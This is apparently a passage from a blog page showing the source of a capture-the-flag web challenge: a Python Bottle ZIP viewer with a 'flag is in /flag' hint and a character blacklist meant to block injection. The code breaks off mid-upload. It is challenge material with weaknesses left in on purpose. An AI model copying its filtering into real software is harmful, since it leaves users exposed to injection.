+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span><span class="lnt">299
+</span><span class="lnt">300
+</span><span class="lnt">301
+</span><span class="lnt">302
+</span><span class="lnt">303
+</span><span class="lnt">304
+</span><span class="lnt">305
+</span><span class="lnt">306
+</span><span class="lnt">307
+</span><span class="lnt">308
+</span><span class="lnt">309
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">post</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">static_file</span><span class="p">,</span> <span class="n">error</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">shutil</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># hint: flag is in /flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">UPLOAD_DIR</span> <span class="o">=</span> <span class="s1">&#39;uploads&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAX_FILE_SIZE</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>  <span class="c1"># 1MB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BLACKLIST</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;b&#34;</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">,</span><span class="s2">&#34;d&#34;</span><span class="p">,</span><span class="s2">&#34;e&#34;</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">,</span><span class="s2">&#34;j&#34;</span><span class="p">,</span><span class="s2">&#34;k&#34;</span><span class="p">,</span><span class="s2">&#34;m&#34;</span><span class="p">,</span><span class="s2">&#34;n&#34;</span><span class="p">,</span><span class="s2">&#34;o&#34;</span><span class="p">,</span><span class="s2">&#34;p&#34;</span><span class="p">,</span><span class="s2">&#34;q&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="s2">&#34;s&#34;</span><span class="p">,</span><span class="s2">&#34;t&#34;</span><span class="p">,</span><span class="s2">&#34;u&#34;</span><span class="p">,</span><span class="s2">&#34;v&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">,</span><span class="s2">&#34;x&#34;</span><span class="p">,</span><span class="s2">&#34;y&#34;</span><span class="p">,</span><span class="s2">&#34;z&#34;</span><span class="p">,</span><span class="s2">&#34;%&#34;</span><span class="p">,</span><span class="s2">&#34;;&#34;</span><span class="p">,</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;:&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;检查内容是否包含黑名单中的关键词（不区分大小写）&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">any</span><span class="p">(</span><span class="n">black_word</span> <span class="ow">in</span> <span class="n">content</span> <span class="k">for</span> <span class="n">black_word</span> <span class="ow">in</span> <span class="n">BLACKLIST</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">safe_extract_zip</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="n">extract_dir</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;安全解压ZIP文件（防止路径遍历攻击）&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">zf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">member</span> <span class="ow">in</span> <span class="n">zf</span><span class="o">.</span><span class="n">infolist</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="n">member_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">member</span><span class="o">.</span><span class="n">filename</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">member_path</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;非法文件路径: 路径遍历攻击检测&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">zf</span><span class="o">.</span><span class="n">extract</span><span class="p">(</span><span class="n">member</span><span class="p">,</span> <span class="n">extract_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;首页&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;html lang=&#34;zh-CN&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;title&gt;ZIP文件查看器&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;div class=&#34;header text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;row justify-content-center&#34; id=&#34;index-page&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;col-md-8 text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;card&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-body p-5&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;emoji-icon&#34;&gt;📤&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h2 class=&#34;card-title&#34;&gt;轻松查看ZIP文件内容&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;p class=&#34;card-text&#34;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;mt-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;a href=&#34;/upload&#34; class=&#34;btn btn-primary btn-lg px-4 me-3&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                📁 上传ZIP文件
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;a href=&#34;#features&#34; class=&#34;btn btn-outline-secondary btn-lg px-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                ℹ️ 了解更多
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;row mt-5&#34; id=&#34;features&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;col-md-4 mb-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;card h-100&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-body text-center p-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;emoji-icon&#34;&gt;🛡️&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h4&gt;安全检测&lt;/h4&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;col-md-4 mb-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;card h-100&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-body text-center p-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;emoji-icon&#34;&gt;📄&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h4&gt;内容预览&lt;/h4&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;col-md-4 mb-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;card h-100&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-body text-center p-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;emoji-icon&#34;&gt;⚡&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h4&gt;快速处理&lt;/h4&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_page</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;上传页面&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;html lang=&#34;zh-CN&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;title&gt;上传ZIP文件&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;div class=&#34;header text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;div class=&#34;container mt-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;row justify-content-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;col-md-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;card&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-header bg-primary text-white&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h4 class=&#34;mb-0&#34;&gt;📤 上传ZIP文件&lt;/h4&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-body&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;form action=&#34;/upload&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34; class=&#34;upload-form&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;div class=&#34;mb-3&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                &lt;label for=&#34;fileInput&#34; class=&#34;form-label&#34;&gt;选择ZIP文件（最大1MB）&lt;/label&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                &lt;input class=&#34;form-control&#34; type=&#34;file&#34; name=&#34;file&#34; id=&#34;fileInput&#34; accept=&#34;.zip&#34; required&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                &lt;div class=&#34;form-text&#34;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary w-100&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                📤 上传文件
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;text-center mt-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        ↩️ 返回首页
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;处理文件上传&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">zip_file</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.zip&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;请上传有效的ZIP文件&#39;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">file_size</span> <span class="o">=</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_size</span> <span class="o">&gt;</span> <span class="n">MAX_FILE_SIZE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;文件大小超过限制(</span><span class="si">{</span><span class="n">MAX_FILE_SIZE</span><span class="o">/</span><span class="mi">1024</span><span class="o">/</span><span class="mi">1024</span><span class="si">}</span><span class="s1">MB)&#39;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
